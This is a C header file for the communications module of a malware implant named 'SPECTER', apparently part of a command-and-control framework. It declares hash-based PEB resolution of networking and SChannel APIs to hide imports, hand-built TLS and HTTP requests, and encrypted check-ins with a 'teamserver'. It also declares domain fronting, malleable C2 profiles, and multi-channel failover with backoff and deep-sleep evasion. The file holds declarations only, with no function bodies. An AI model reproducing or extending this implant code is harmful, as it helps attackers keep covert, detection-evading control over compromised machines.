/**
 * SPECTER Implant — Communications Engine Interface
 *
 * Raw socket operations via PEB-resolved ws2_32.dll, TLS via SChannel
 * (secur32.dll/sspicli.dll), manual HTTP/1.1 request/response construction,
 * and encrypted check-in protocol using ChaCha20-Poly1305 AEAD.
 */

#ifndef COMMS_H
#define COMMS_H

#include "specter.h"
#include "ntdefs.h"
#include "crypto.h"
#include "config.h"
#include "profile.h"
#include "transform.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

#define COMMS_SEND_BUF_SIZE     4096
#define COMMS_RECV_BUF_SIZE     8192
#define COMMS_MAX_HEADERS       16
#define COMMS_MAX_HEADER_LEN    256
#define COMMS_MAX_URI_LEN       512
#define COMMS_MAX_HOST_LEN      256

/* Wire protocol: [4-byte LE length][24-byte header][ciphertext][16-byte tag] */
#define COMMS_WIRE_LEN_SIZE     4
#define COMMS_WIRE_NONCE_SIZE   12
#define COMMS_WIRE_IMPLANT_ID   12   /* First 12 bytes: implant pubkey prefix */
#define COMMS_WIRE_HEADER_SIZE  (COMMS_WIRE_IMPLANT_ID + COMMS_WIRE_NONCE_SIZE)
#define COMMS_WIRE_TAG_SIZE     16

/* HTTP method constants */
#define COMMS_HTTP_GET          0
#define COMMS_HTTP_POST         1

/* DJB2 hashes for PEB-resolved DLLs and functions */
#define HASH_WS2_32_DLL         0x9AD10B0F  /* "ws2_32.dll"        */
#define HASH_WSASTARTUP         0x998B3F03  /* "WSAStartup"        */
#define HASH_SOCKET             0x1C31032E  /* "socket"             */
#define HASH_CONNECT            0xD3764DCF  /* "connect"            */
#define HASH_SEND               0x7C9DDB4F  /* "send"               */
#define HASH_RECV               0x7C9D4D95  /* "recv"               */
#define HASH_CLOSESOCKET        0x494CB104  /* "closesocket"        */
#define HASH_GETADDRINFO        0x7C84CDCC  /* "getaddrinfo"        */
#define HASH_FREEADDRINFO       0x526629CE  /* "freeaddrinfo"       */

#define HASH_SECUR32_DLL        0x347A54B6  /* "secur32.dll"        */
#define HASH_SSPICLI_DLL        0x4A79C746  /* "sspicli.dll"        */
#define HASH_ACQUIRECREDHANDLE  0x1F26440A  /* "AcquireCredentialsHandleA" */
#define HASH_INITSECCTX         0x3E84CAB5  /* "InitializeSecurityContextA" */
#define HASH_DELETESECCTX       0x93D53795  /* "DeleteSecurityContext" */
#define HASH_FREECREDHANDLE     0xDFA34A41  /* "FreeCredentialsHandle" */
#define HASH_ENCRYPTMSG         0x80C3BFAF  /* "EncryptMessage"     */
#define HASH_DECRYPTMSG         0x7B2C3085  /* "DecryptMessage"     */
#define HASH_QUERYSECCTXATTR    0x0C4BF108  /* "QueryContextAttributesA" */
#define HASH_FREECTXBUFFER      0xC59177A6  /* "FreeContextBuffer"  */
#define HASH_APPLYCTRLTOKEN     0x45BBC00D  /* "ApplyControlToken"  */

/* Winsock constants */
#define AF_INET                 2
#define AF_INET6                23
#define SOCK_STREAM             1
#define IPPROTO_TCP             6
#define AI_NUMERICSERV          0x00000008
#define SOCKET_ERROR            (-1)
#define INVALID_SOCKET          (~(ULONG_PTR)0)
#define SD_SEND                 1

/* SChannel constants */
#define UNISP_NAME_A            "Microsoft Unified Security Protocol Provider"
#define SECPKG_CRED_OUTBOUND    0x00000002
#define ISC_REQ_SEQUENCE_DETECT       0x00000008
#define ISC_REQ_REPLAY_DETECT         0x00000004
#define ISC_REQ_CONFIDENTIALITY       0x00000010
#define ISC_REQ_ALLOCATE_MEMORY       0x00000100
#define ISC_REQ_STREAM                0x00008000
#define ISC_REQ_MANUAL_CRED_VALIDATION 0x00080000

#define SECBUFFER_DATA           1
#define SECBUFFER_TOKEN          2
#define SECBUFFER_EMPTY          0
#define SECBUFFER_EXTRA          5
#define SECBUFFER_STREAM_HEADER  7
#define SECBUFFER_STREAM_TRAILER 6
#define SECBUFFER_ALERT          17

#define SEC_E_OK                        ((LONG)0x00000000)
#define SEC_I_CONTINUE_NEEDED           ((LONG)0x00090312)
#define SEC_E_INCOMPLETE_MESSAGE        ((LONG)0x80090318)
#define SEC_I_INCOMPLETE_CREDENTIALS    ((LONG)0x00090320)
#define SEC_I_CONTEXT_EXPIRED           ((LONG)0x00090317)
#define SEC_I_RENEGOTIATE               ((LONG)0x00090321)
#define SECPKG_ATTR_STREAM_SIZES        4

/* SP_PROT flags for SChannel */
#define SP_PROT_TLS1_2_CLIENT   0x00000800
#define SP_PROT_TLS1_3_CLIENT   0x00002000
#define SCH_USE_STRONG_CRYPTO   0x00400000

/* ------------------------------------------------------------------ */
/*  Winsock / SChannel structures                                      */
/* ------------------------------------------------------------------ */

/* Minimal Winsock structures for raw socket operations */
typedef struct _WSADATA {
    WORD  wVersion;
    WORD  wHighVersion;
    char  szDescription[257];
    char  szSystemStatus[129];
    WORD  iMaxSockets;
    WORD  iMaxUdpDg;
    char *lpVendorInfo;
} WSADATA;

typedef struct _ADDRINFO {
    int              ai_flags;
    int              ai_family;
    int              ai_socktype;
    int              ai_protocol;
    SIZE_T           ai_addrlen;
    char            *ai_canonname;
    struct _SOCKADDR *ai_addr;
    struct _ADDRINFO *ai_next;
} ADDRINFO;

typedef struct _SOCKADDR {
    WORD  sa_family;
    char  sa_data[14];
} SOCKADDR;

/* SChannel credential/context handles */
typedef struct _SecHandle {
    ULONG_PTR dwLower;
    ULONG_PTR dwUpper;
} SecHandle, CredHandle, CtxtHandle;

typedef struct _SecBuffer {
    DWORD cbBuffer;
    DWORD BufferType;
    PVOID pvBuffer;
} SecBuffer;

typedef struct _SecBufferDesc {
    DWORD     ulVersion;
    DWORD     cBuffers;
    SecBuffer *pBuffers;
} SecBufferDesc;

#define SECBUFFER_VERSION 0

typedef struct _SCHANNEL_CRED {
    DWORD  dwVersion;
    DWORD  cCreds;
    PVOID  paCred;
    PVOID  hRootStore;
    DWORD  cMappers;
    PVOID  aphMappers;
    DWORD  cSupportedAlgs;
    PVOID  palgSupportedAlgs;
    DWORD  grbitEnabledProtocols;
    DWORD  dwMinimumCipherStrength;
    DWORD  dwMaximumCipherStrength;
    DWORD  dwSessionLifespan;
    DWORD  dwFlags;
    DWORD  dwCredFormat;
} SCHANNEL_CRED;

#define SCHANNEL_CRED_VERSION 4

typedef struct _SecPkgContext_StreamSizes {
    DWORD cbHeader;
    DWORD cbTrailer;
    DWORD cbMaximumMessage;
    DWORD cBuffers;
    DWORD cbBlockSize;
} SecPkgContext_StreamSizes;

/* ------------------------------------------------------------------ */
/*  Function pointer types for PEB-resolved APIs                       */
/* ------------------------------------------------------------------ */

typedef int  (__attribute__((stdcall)) *fn_WSAStartup)(WORD, WSADATA *);
typedef ULONG_PTR (__attribute__((stdcall)) *fn_socket)(int, int, int);
typedef int  (__attribute__((stdcall)) *fn_connect)(ULONG_PTR, const SOCKADDR *, int);
typedef int  (__attribute__((stdcall)) *fn_send)(ULONG_PTR, const char *, int, int);
typedef int  (__attribute__((stdcall)) *fn_recv)(ULONG_PTR, char *, int, int);
typedef int  (__attribute__((stdcall)) *fn_closesocket)(ULONG_PTR);
typedef int  (__attribute__((stdcall)) *fn_getaddrinfo)(const char *, const char *, const ADDRINFO *, ADDRINFO **);
typedef void (__attribute__((stdcall)) *fn_freeaddrinfo)(ADDRINFO *);

typedef LONG (__attribute__((stdcall)) *fn_AcquireCredentialsHandleA)(
    char *, char *, DWORD, PVOID, PVOID, PVOID, PVOID, CredHandle *, PVOID);
typedef LONG (__attribute__((stdcall)) *fn_InitializeSecurityContextA)(
    CredHandle *, CtxtHandle *, char *, DWORD, DWORD, DWORD,
    SecBufferDesc *, DWORD, CtxtHandle *, SecBufferDesc *, PULONG, PVOID);
typedef LONG (__attribute__((stdcall)) *fn_DeleteSecurityContext)(CtxtHandle *);
typedef LONG (__attribute__((stdcall)) *fn_FreeCredentialsHandle)(CredHandle *);
typedef LONG (__attribute__((stdcall)) *fn_EncryptMessage)(CtxtHandle *, DWORD, SecBufferDesc *, DWORD);
typedef LONG (__attribute__((stdcall)) *fn_DecryptMessage)(CtxtHandle *, SecBufferDesc *, DWORD, PULONG);
typedef LONG (__attribute__((stdcall)) *fn_QueryContextAttributesA)(CtxtHandle *, DWORD, PVOID);
typedef LONG (__attribute__((stdcall)) *fn_FreeContextBuffer)(PVOID);
typedef LONG (__attribute__((stdcall)) *fn_ApplyControlToken)(CtxtHandle *, SecBufferDesc *);

/* ------------------------------------------------------------------ */
/*  Connection state enumeration                                       */
/* ------------------------------------------------------------------ */

typedef enum _COMMS_STATE {
    COMMS_STATE_DISCONNECTED = 0,
    COMMS_STATE_TCP_CONNECTED,
    COMMS_STATE_TLS_HANDSHAKE,
    COMMS_STATE_TLS_CONNECTED,
    COMMS_STATE_REGISTERED,
    COMMS_STATE_ERROR,
} COMMS_STATE;

/* ------------------------------------------------------------------ */
/*  Per-channel failover state                                         */
/* ------------------------------------------------------------------ */

/* Backoff schedule: 1min, 5min, 15min, 1hr, 4hr, 12hr (in ms) */
#define FAILOVER_BACKOFF_STEPS   6
#define FAILOVER_DEEP_SLEEP_MULT 10   /* Deep sleep = 10x normal interval  */

typedef enum _CHANNEL_HEALTH {
    CHANNEL_HEALTHY     = 0,
    CHANNEL_DEGRADED    = 1,   /* Some failures, still trying          */
    CHANNEL_FAILED      = 2,   /* Exceeded max_retries, backed off     */
    CHANNEL_DEEP_SLEEP  = 3,   /* All channels exhausted               */
} CHANNEL_HEALTH;

typedef struct _CHANNEL_STATE {
    COMMS_STATE    conn_state;        /* Per-channel connection state        */
    DWORD          consecutive_fails; /* Consecutive failure count           */
    QWORD          last_attempt;      /* Tick count of last attempt (ms)     */
    DWORD          backoff_delay;     /* Current backoff delay (ms)          */
    DWORD          backoff_index;     /* Index into backoff schedule         */
    CHANNEL_HEALTH health;            /* Overall channel health              */
} CHANNEL_STATE;

/* ------------------------------------------------------------------ */
/*  Resolved API cache                                                 */
/* ------------------------------------------------------------------ */

typedef struct _COMMS_API {
    /* ws2_32.dll */
    fn_WSAStartup        pWSAStartup;
    fn_socket            pSocket;
    fn_connect           pConnect;
    fn_send              pSend;
    fn_recv              pRecv;
    fn_closesocket       pClosesocket;
    fn_getaddrinfo       pGetaddrinfo;
    fn_freeaddrinfo      pFreeaddrinfo;
    /* secur32.dll / sspicli.dll */
    fn_AcquireCredentialsHandleA pAcquireCredentialsHandleA;
    fn_InitializeSecurityContextA pInitializeSecurityContextA;
    fn_DeleteSecurityContext      pDeleteSecurityContext;
    fn_FreeCredentialsHandle      pFreeCredentialsHandle;
    fn_EncryptMessage             pEncryptMessage;
    fn_DecryptMessage             pDecryptMessage;
    fn_QueryContextAttributesA    pQueryContextAttributesA;
    fn_FreeContextBuffer          pFreeContextBuffer;
    fn_ApplyControlToken          pApplyControlToken;
    BOOL resolved;
} COMMS_API;

/* ------------------------------------------------------------------ */
/*  COMMS_CONTEXT — main communications state                          */
/* ------------------------------------------------------------------ */

typedef struct _COMMS_CONTEXT {
    DWORD          active_channel;     /* Index into config channels[]    */
    ULONG_PTR      socket;             /* Raw socket handle               */
    CredHandle     cred_handle;        /* SChannel credential handle      */
    CtxtHandle     sec_context;        /* SChannel security context       */
    BOOL           context_valid;      /* Whether sec_context is usable   */
    SecPkgContext_StreamSizes stream_sizes; /* TLS stream sizes            */
    BYTE           session_key[32];    /* Derived session key (HKDF)      */
    DWORD          msg_seq;            /* Message sequence number         */
    BYTE           send_buf[COMMS_SEND_BUF_SIZE];
    BYTE           recv_buf[COMMS_RECV_BUF_SIZE];
    COMMS_STATE    state;              /* Current connection state         */
    COMMS_API      api;                /* Resolved function pointers      */
    BOOL           wsa_initialized;    /* WSAStartup called successfully  */
    PROFILE_CONFIG *profile;           /* Malleable C2 profile (or NULL)  */
    /* Per-channel failover state */
    CHANNEL_STATE  channel_states[CONFIG_MAX_CHANNELS];
    BOOL           deep_sleep_mode;    /* All channels exhausted           */
    DWORD          retry_check_counter; /* Counter for periodic retry      */
} COMMS_CONTEXT;

/* ------------------------------------------------------------------ */
/*  HTTP parsed header entry                                           */
/* ------------------------------------------------------------------ */

typedef struct _HTTP_HEADER {
    char name[COMMS_MAX_HEADER_LEN];
    char value[COMMS_MAX_HEADER_LEN];
} HTTP_HEADER;

/* ------------------------------------------------------------------ */
/*  Raw TCP operations                                                 */
/* ------------------------------------------------------------------ */

NTSTATUS comms_tcp_connect(COMMS_CONTEXT *ctx, const char *host, DWORD port);
NTSTATUS comms_tcp_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len);
NTSTATUS comms_tcp_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received);
NTSTATUS comms_tcp_close(COMMS_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  TLS via SChannel                                                   */
/* ------------------------------------------------------------------ */

NTSTATUS comms_tls_init(COMMS_CONTEXT *ctx);
NTSTATUS comms_tls_handshake(COMMS_CONTEXT *ctx, const char *hostname);
NTSTATUS comms_tls_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len);
NTSTATUS comms_tls_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received);
NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Domain fronting helpers                                            */
/* ------------------------------------------------------------------ */

/**
 * Check whether the active channel has domain fronting configured.
 * Returns TRUE if sni_domain is non-empty on the active channel.
 */
BOOL comms_is_fronting_enabled(COMMS_CONTEXT *ctx, const CHANNEL_CONFIG *channel);

/**
 * Get the TLS SNI hostname for the active channel.
 * Returns channel->sni_domain if fronting is enabled, otherwise channel->url.
 */
const char *comms_get_sni_hostname(COMMS_CONTEXT *ctx, const CHANNEL_CONFIG *channel);

/**
 * Get the HTTP Host header value for the active channel.
 * Returns channel->host_domain if fronting is enabled, otherwise channel->url.
 */
const char *comms_get_http_host(COMMS_CONTEXT *ctx, const CHANNEL_CONFIG *channel);

/* ------------------------------------------------------------------ */
/*  HTTP/1.1 request/response construction                             */
/* ------------------------------------------------------------------ */

/**
 * Build an HTTP/1.1 request into output buffer.
 * method: COMMS_HTTP_GET or COMMS_HTTP_POST
 * Returns number of bytes written, or 0 on error.
 */
DWORD comms_http_build_request(DWORD method, const char *uri,
    const char *host, const char *headers, const BYTE *body,
    DWORD body_len, BYTE *output, DWORD output_len);

/**
 * Parse an HTTP/1.1 response.
 * Returns STATUS_SUCCESS on success.
 */
NTSTATUS comms_http_parse_response(const BYTE *data, DWORD data_len,
    DWORD *status_code_out, HTTP_HEADER *headers_out,
    DWORD *header_count_out, const BYTE **body_out, DWORD *body_len_out);

/* ------------------------------------------------------------------ */
/*  Check-in protocol                                                  */
/* ------------------------------------------------------------------ */

/**
 * Perform an encrypted check-in with the teamserver.
 * Builds payload, encrypts via AEAD, POSTs, parses response,
 * decrypts, and extracts tasks.
 * Returns STATUS_SUCCESS on success.
 */
NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx);

/**
 * Initialize comms: resolve APIs, read channel config, generate
 * ephemeral keypair, derive session key, connect, register.
 */
NTSTATUS comms_init(IMPLANT_CONTEXT *ctx);

/**
 * Switch to the next priority channel on failure.
 * Returns STATUS_SUCCESS if a new channel is available.
 */
NTSTATUS comms_rotate_channel(IMPLANT_CONTEXT *ctx);

/**
 * Check health of the active channel. Resets failure counter on success,
 * increments on failure. Returns STATUS_SUCCESS if channel is healthy.
 */
NTSTATUS comms_health_check(IMPLANT_CONTEXT *ctx);

/**
 * Triggered when active channel exceeds max_retries.
 * Disconnects current channel, tries next priority channel.
 * If all channels exhausted, enters deep sleep mode (10x interval).
 * Returns STATUS_SUCCESS if a working channel was found.
 */
NTSTATUS comms_failover(IMPLANT_CONTEXT *ctx);

/**
 * Retry previously failed channels on exponential backoff schedule.
 * Backoff: 1min → 5min → 15min → 1hr → 4hr → 12hr max.
 * Switches back to higher-priority channel on recovery.
 * Returns STATUS_SUCCESS if a better channel was recovered.
 */
NTSTATUS comms_retry_failed(IMPLANT_CONTEXT *ctx);

/**
 * Get the current backoff delay for a given backoff index.
 * Returns delay in milliseconds.
 */
DWORD comms_get_backoff_delay(DWORD index);

/**
 * Get the profile pointer from a comms context (for use by sleep.c).
 */
PROFILE_CONFIG *comms_get_profile_ptr(PVOID comms_ctx);

/**
 * Attach a malleable C2 profile to the comms engine.
 * When a profile is set, comms_checkin() uses profile-driven request
 * construction (URI rotation, custom headers, body embedding, transform chain).
 */
NTSTATUS comms_set_profile(IMPLANT_CONTEXT *ctx, PROFILE_CONFIG *profile);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void comms_test_set_session_key(COMMS_CONTEXT *ctx, const BYTE key[32]);
void comms_test_set_tick(QWORD tick_ms);
COMMS_CONTEXT *comms_test_get_context(void);
#endif

#endif /* COMMS_H */
